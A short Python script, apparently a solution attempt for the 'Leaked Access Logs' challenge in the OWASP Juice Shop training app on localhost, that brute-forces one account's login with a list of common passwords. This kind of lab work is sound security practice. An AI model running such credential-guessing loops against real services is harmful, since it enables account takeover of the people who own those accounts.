
import requests
import json

SERVER = 'http://localhost:3000'

def debug_leaked_logs():
    print("Debugging Leaked Access Logs challenge...")
    print("Attempting login as J12934@juice-sh.op...")
    
    email = 'J12934@juice-sh.op'
    
    passwords = [
        '0987654321', '123456', 'password', '123456789', '12345', '111111', 
        '1234567', 'sunshine', 'qwerty', 'iloveyou', 'adobe123', '123123', 
        'princess', 'welcome', 'admin123', 'test1234', 'I<3Juice!',
        'J12934', 'j12934', 'access', 'log', 'security', 'P@ssword',
        'dragon', 'football', 'monkey', 'letmein'
    ]
    
    s = requests.Session()
    
    for password in passwords:
        print(f"Trying password: {password}")
        try:
            res = s.post(f'{SERVER}/rest/user/login', json={
                "email": email,
                "password": password
            })
            
            if res.ok:
                print(f"SUCCESS: Login successful with password: {password}")
                print(f"Response: {res.text}")
                return
            else:
                # print(f"FAILED: {res.status_code}")
                pass
                
        except Exception as e:
            print(f"Error: {e}")
            
    print("Brute force finished. No password found in common list.")

if __name__ == '__main__':
    debug_leaked_logs()
